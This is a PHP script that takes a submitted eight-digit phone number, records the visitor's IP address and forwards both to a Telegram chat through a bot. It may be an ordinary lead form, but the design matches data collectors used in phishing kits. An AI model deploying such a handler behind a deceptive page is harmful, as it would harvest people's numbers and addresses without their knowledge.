<?php
// Incluir el archivo de configuración
include 'config.php';

// Verificar que las variables estén definidas
if (!isset($token) || !isset($chat_id)) {
    die(json_encode(["success" => false, "message" => "Error: Configuración de Telegram no encontrada."]));
}

// Obtener los datos enviados por POST
$input = file_get_contents("php://input");
$data = json_decode($input, true);
$telefono = $data['telefono'] ?? '';

// Validar el número de teléfono
if (!preg_match('/^[0-9]{8}$/', $telefono)) {
    die(json_encode(["success" => false, "message" => "Número de teléfono no válido."]));
}

// Obtener la IP del cliente
$ip_cliente = $_SERVER['REMOTE_ADDR'];

// Crear el mensaje
$mensaje = "📞 *Nuevo número recibido* 📞\n\n";
$mensaje .= "📱 *Número de Teléfono*: $telefono\n";
$mensaje .= "🌍 *IP del Cliente*: $ip_cliente\n";

// Enviar los datos a Telegram
$telegram_url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => 'Markdown'
];

// Usar cURL para enviar la solicitud a Telegram
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegram_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Responder con éxito o error
if ($response === false) {
    echo json_encode(["success" => false, "message" => "Error al enviar el mensaje a Telegram."]);
} else {
    echo json_encode(["success" => true, "message" => "Mensaje enviado con éxito."]);
}
?>
